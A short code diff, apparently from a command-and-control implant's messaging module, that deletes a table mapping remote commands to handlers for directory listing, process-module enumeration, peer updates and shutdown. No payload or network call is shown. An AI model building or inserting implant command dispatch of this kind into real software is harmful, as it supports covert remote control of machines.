@@ -1,14 +1,6 @@
 #include <core/corelib.hpp>
 namespace Message {
 
-    RDATA_SECTION COMMAND_MAP CmdMap[] = {
-        { .Id = CommandDir,         .Function = Commands::DirectoryList },
-        { .Id = CommandMods,        .Function = Commands::ProcessModules },
-        { .Id = CommandUpdatePeer,  .Function = Commands::UpdatePeer },
-        { .Id = CommandShutdown,    .Function = Commands::Shutdown },
-        { .Id = 0,                  .Function = nullptr }
-    };
-
     BOOL PeekPID(PSTREAM Stream) {
         HEXANE
         UINT Pid = 0;
